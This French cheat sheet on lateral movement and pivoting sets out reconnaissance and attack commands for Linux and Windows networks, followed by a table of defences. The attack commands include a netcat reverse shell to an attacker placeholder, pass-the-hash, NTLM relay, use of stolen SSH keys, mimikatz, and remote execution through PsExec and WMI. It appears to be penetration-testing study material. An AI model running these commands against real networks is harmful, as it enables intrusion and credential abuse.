# lateral-movement.md

## cheat sheet - Mouvement latéral (Pivoting)

Ce document détaille les techniques de mouvement latéral dans un réseau, à des fins éducatives et légales uniquement.

---

## 1. Comprendre le mouvement latéral

Le mouvement latéral consiste à naviguer dans un réseau après une compromission initiale pour atteindre d’autres systèmes ou données sensibles.

| **Aspect**           | **Description**                                      |
|----------------------|-----------------------------------------------------|
| **Objectif**         | Accéder à des cibles critiques (ex. : DC, DB)       |
| **Prérequis**        | Accès initial à une machine compromise              |
| **Moyen**            | Exploitation de creds, services, ou réseau          |

---

## 2. Techniques de mouvement latéral (Linux)

### Reconnaissance
| **Commande**                 | **Description**                                      |
|------------------------------|-----------------------------------------------------|
| `ifconfig; ip a`             | Récupère les interfaces réseau                      |
| `arp -n`                     | Liste les hôtes dans le cache ARP                   |
| `netstat -tulnp`             | Identifie les ports/services actifs                 |
| `cat /etc/hosts`             | Liste les hôtes connus                              |
| `nmap -sn 192.168.1.0/24`    | Scan réseau pour hôtes actifs                       |

### Exploitation
| **Technique**                | **Exemple**                        | **Description**                     |
|------------------------------|------------------------------------|-------------------------------------|
| SSH pivoting                 | `ssh -D 9050 user@target`          | Crée un proxy SOCKS via SSH         |
| Pass-the-Key                 | `ssh user@target -i stolen_key`    | Utilise une clé SSH volée           |
| SMB relay                    | `impacket-ntlmrelayx -tf targets.txt` | Relaye NTLM vers une autre cible |
| Reverse shell                | `nc -e /bin/sh <attacker_ip> 4444` | Envoie un shell à l’attaquant      |
| Exploitation service         | `msf: exploit/ssh_login`           | Exploite un service vulnérable      |

---

## 3. Techniques de mouvement latéral (Windows)

### Reconnaissance
| **Commande**                 | **Description**                                      |
|------------------------------|-----------------------------------------------------|
| `ipconfig /all`              | Récupère les configs réseau                         |
| `arp -a`                     | Liste les hôtes dans le cache ARP                   |
| `net view`                   | Liste les machines du domaine                       |
| `netstat -ano`               | Identifie les ports/services actifs                 |
| `ping 192.168.1.1-254`       | Vérifie les hôtes actifs                            |

### Exploitation
| **Technique**                | **Exemple**                        | **Description**                     |
|------------------------------|------------------------------------|-------------------------------------|
| Pass-the-Hash                | `pth-winexe -U <hash> <target>`    | Utilise un hash NTLM                |
| PSExec                       | `psexec.py domain/user@<target>`   | Exécute une commande via SMB        |
| WMI                          | `wmic /node:<target> process call create "cmd"` | Lance une commande à distance |
| RDP                          | `xfreerdp /u:user /p:pass /v:<target>` | Connexion RDP avec creds         |
| Token stealing               | `mimikatz: sekurlsa::pth`          | Utilise un jeton pour accès         |

---

## 4. Pivoting réseau

| **Technique**                | **Exemple**                        | **Description**                     |
|------------------------------|------------------------------------|-------------------------------------|
| SOCKS Proxy                  | `ssh -D 9050 user@<pivot>`         | Tunnel via proxy SOCKS              |
| Port Forwarding              | `ssh -L 445:<target>:445 <pivot>`  | Redirige un port local              |
| Reverse Port Forwarding      | `ssh -R 4444:<attacker>:4444 <pivot>` | Redirige un port distant         |
| Meterpreter pivot            | `msf: route add <subnet>`          | Ajoute une route dans Metasploit    |
| Proxychains                  | `proxychains nmap <target>`        | Utilise un proxy pour scan          |

---

## 5. Préventions

| **Moyen**                    | **Explication**                                      |
|------------------------------|-----------------------------------------------------|
| Segmentation réseau          | Limiter les connexions entre machines               |
| Désactiver services inutiles | Réduire les points d’entrée (ex. : SMB, RDP)        |
| Authentification forte       | MFA pour bloquer le vol de creds                    |
| Surveiller le trafic         | Détecter les scans ou connexions suspectes          |
| Restreindre creds            | Ne pas réutiliser les mots de passe                 |
| Désactiver LLMNR/NBNS        | Prévenir les relais NTLM                            |
| Pare-feu strict              | Bloquer les ports non nécessaires                   |
| Journalisation               | Tracer les connexions et commandes                  |
| Mettre à jour systèmes       | Corriger les failles exploitables                   |
| Sensibilisation              | Former les utilisateurs aux risques                 |

---

## 6. Précautions

- **Usage légal** : Tests uniquement sur réseaux autorisés.
- **Outils** : Metasploit, Impacket, Proxychains, Nmap pour automatisation.
- **Isolation** : Tester dans un lab sécurisé.
  
